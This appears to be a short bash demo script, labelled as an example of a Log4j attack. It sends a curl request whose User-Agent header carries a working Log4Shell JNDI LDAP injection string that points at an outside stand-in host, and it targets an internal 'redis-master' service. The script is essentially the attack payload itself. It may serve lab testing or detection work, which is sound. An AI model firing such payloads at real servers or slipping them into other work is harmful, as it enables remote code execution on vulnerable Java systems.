#!/usr/bin/env bash

echo "run example of log4j attack"
echo
curl -v -s -k -o /dev/null -H "Content-Type: application/json" -H 'User-Agent: Mozilla/5.0 ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}' -d '{"names": ["sensor-1"]}' http://redis-master:6379

